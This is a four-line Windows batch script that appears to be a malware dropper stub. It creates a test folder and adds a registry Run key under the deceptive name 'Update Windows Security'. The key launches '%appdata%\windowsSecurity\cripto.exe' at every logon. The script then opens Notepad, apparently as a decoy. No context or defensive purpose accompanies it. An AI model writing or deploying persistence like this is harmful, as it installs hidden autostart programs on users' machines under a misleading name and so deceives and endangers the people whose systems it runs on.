@echo off
mkdir testtest
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Update Windows Security" /t REG_SZ /d "%appdata%\windowsSecurity\cripto.exe" /f
notepad.exe